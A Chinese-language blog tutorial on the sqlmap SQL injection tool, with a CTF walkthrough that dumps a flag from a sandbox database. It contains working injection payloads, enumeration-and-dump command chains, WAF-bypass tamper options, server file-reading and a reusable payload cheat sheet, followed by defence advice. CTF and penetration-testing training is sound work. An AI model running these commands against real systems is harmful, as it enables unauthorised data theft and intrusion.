---
title: "sqlmap 使用指南：从入门到 CTF 夺旗"
date: 2026-06-02T22:47:00+08:00
draft: false
tags: ["CTF", "Web安全", "SQL注入", "sqlmap", "工具使用"]
categories: ["技术笔记"]
---

## 什么是 sqlmap

sqlmap 是一款开源的自动化 SQL 注入工具，支持检测和利用多种类型的 SQL 注入漏洞，能够自动识别后端数据库类型、枚举数据库结构、提取数据，甚至获取操作系统 shell。在 CTF 比赛和渗透测试中，它是处理 SQL 注入效率最高的工具之一。

---

## 安装

### 方式一：直接克隆源码（推荐）

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version
```

### 方式二：包管理器安装

```bash
# Debian/Ubuntu
sudo apt install sqlmap

# macOS
brew install sqlmap

# Python pip
pip install sqlmap
```

---

## 核心参数速查

| 参数 | 说明 |
|------|------|
| `-u URL` | 指定目标 URL |
| `--data "data"` | POST 数据包 |
| `-p "param"` | 指定测试参数 |
| `--tables` | 枚举所有表名 |
| `--columns -T table` | 枚举指定表的列名 |
| `--dump -T table` | 导出指定表的数据 |
| `--dump -C col -T table` | 导出指定列的数据 |
| `-D dbname` | 指定数据库名 |
| `--dbs` | 枚举所有数据库 |
| `--batch` | 自动选择默认选项，无需交互 |
| `--threads 10` | 设置线程数，加快检测速度 |
| `--level 1-5` | 检测等级，默认 1，越高测试越全面 |
| `--risk 1-3` | 风险等级，默认 1，越高越激进 |
| `--technique` | 指定注入技术（如 `B,E,U,T,Q`）|
| `--os-shell` | 获取操作系统 shell（需要权限）|
| `--file-read /path` | 读取服务器文件 |
| `--tamper` | 使用 tamper 脚本绕过 WAF |

---

## 实战：CTF 中的标准操作流程

以下以一次真实的 CTF 题目为例，展示完整的 sqlmap 利用链。

### 题目环境

```
http://challenge-fd9b924ef336b5fa.sandbox.ctfhub.com:10800/?id=1
```

### Step 1：检测注入点

直接使用 `-u` 参数让 sqlmap 自动检测：

```bash
python sqlmap.py -u "http://challenge-fd9b924ef336b5fa.sandbox.ctfhub.com:10800/?id=1"
```

sqlmap 会自动测试各种注入技术（布尔盲注、报错注入、时间盲注、UNION 注入等）。如果过程中弹出交互式提问，可以加上 `--batch` 自动选择默认答案。

**检测结果示例：**

```
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6044 FROM (SELECT(SLEEP(5)))rMiZ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-5486 UNION ALL SELECT CONCAT(...),NULL-- -
```

检测到两种注入方式：**时间盲注** 和 **UNION 注入**。

### Step 2：枚举数据库

```bash
python sqlmap.py -u "http://target/?id=1" --dbs
```

输出：

```
[*] information_schema
[*] performance_schema
[*] mysql
[*] sqli
```

CTF 中 flag 通常放在自定义的数据库里，这里锁定 `sqli`。

### Step 3：枚举表名

```bash
python sqlmap.py -u "http://target/?id=1" --tables
```

默认会枚举所有数据库的表。如果已知数据库名，可以加 `-D` 限定范围：

```bash
python sqlmap.py -u "http://target/?id=1" -D sqli --tables
```

输出：

```
Database: sqli
[2 tables]
+-------+
| flag  |
| news  |
+-------+
```

### Step 4：枚举列名

```bash
python sqlmap.py -u "http://target/?id=1" -T flag --columns
```

输出：

```
Database: sqli
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(100) |
+--------+--------------+
```

### Step 5：导出数据

导出整张表：

```bash
python sqlmap.py -u "http://target/?id=1" -T flag --dump
```

仅导出指定列（节省时间和请求数）：

```bash
python sqlmap.py -u "http://target/?id=1" -T flag -C flag --dump
```

输出：

```
Database: sqli
Table: flag
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{a9f73a04458ea72566850f8a} |
+----------------------------------+
```

Flag 到手。

---

## 进阶技巧

### 1. 自动模式（无人值守）

CTF 中为了快速出结果，通常加 `--batch` 跳过所有交互确认：

```bash
python sqlmap.py -u "http://target/?id=1" --tables --batch
```

### 2. 限定注入技术

如果已知是 UNION 注入，可以用 `--technique=U` 跳过其他检测，大幅提速：

```bash
python sqlmap.py -u "http://target/?id=1" --technique=U --tables
```

技术代号对照：
- `B`：布尔盲注
- `E`：报错注入
- `U`：UNION 注入
- `S`：堆叠查询
- `T`：时间盲注
- `Q`：内联查询

### 3. 提高检测深度

默认 `--level=1 --risk=1` 可能检测不到某些注入点。遇到疑似注入但 sqlmap 没报的情况，可以提升等级：

```bash
python sqlmap.py -u "http://target/?id=1" --level=3 --risk=2
```

> **注意**：level 和 risk 越高，发送的请求越多，对目标的压力越大。CTF 中通常没问题，生产环境谨慎使用。

### 4. 使用 Tamper 绕过 WAF

目标有 WAF 拦截时，可以尝试编码绕过：

```bash
python sqlmap.py -u "http://target/?id=1" --tamper=space2comment,charencode
```

常用 tamper：
- `space2comment`：空格替换为注释
- `charencode`：URL 编码
- `base64encode`：Base64 编码
- `randomcase`：随机大小写

查看所有 tamper：

```bash
python sqlmap.py --list-tampers
```

### 5. Cookie 注入与请求头注入

有些注入点不在 URL 参数，而在 Cookie 或请求头中：

```bash
# Cookie 注入
python sqlmap.py -u "http://target/" --cookie="id=1*" --tables

# User-Agent 注入
python sqlmap.py -u "http://target/" --user-agent="Mozilla/1*"

# 注入点用 * 号标记
```

### 6. 读取服务器文件

如果数据库用户有 `FILE` 权限，可以读取服务器上的文件：

```bash
python sqlmap.py -u "http://target/?id=1" --file-read="/flag"
```

### 7. POST 注入

POST 请求的注入点：

```bash
python sqlmap.py -u "http://target/login" --data="username=admin&password=1"
```

### 8. 指定参数测试

当请求中有多个参数，只想测试其中一个：

```bash
python sqlmap.py -u "http://target/?id=1&name=test" -p id --tables
```

---

## 完整 Payload 模板

```bash
# 全自动探测
sqlmap -u "URL" --batch

# 数据库 → 表 → 列 → 数据
sqlmap -u "URL" --dbs --batch
sqlmap -u "URL" -D database --tables --batch
sqlmap -u "URL" -D database -T table --columns --batch
sqlmap -u "URL" -D database -T table -C column --dump --batch

# 一键出 flag（已知表名列名时）
sqlmap -u "URL" -D sqli -T flag -C flag --dump --batch
```

---

## 防御建议

1. **参数化查询（Prepared Statements）**：彻底杜绝 SQL 注入，所有后端语言都原生支持
2. **ORM 框架**：使用 Django ORM、SQLAlchemy、MyBatis 等，避免手动拼接 SQL
3. **最小权限原则**：应用数据库账号只赋予 SELECT/INSERT/UPDATE 必要权限，禁止 `FILE`、`LOAD DATA` 等危险权限
4. **关闭错误回显**：生产环境不暴露数据库报错信息
5. **WAF 防护**：部署 ModSecurity、雷池等 WAF 作为第二层防护，但不能替代代码层修复

---

## 参考链接

- [sqlmap 官方文档](https://sqlmap.org/)
- [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
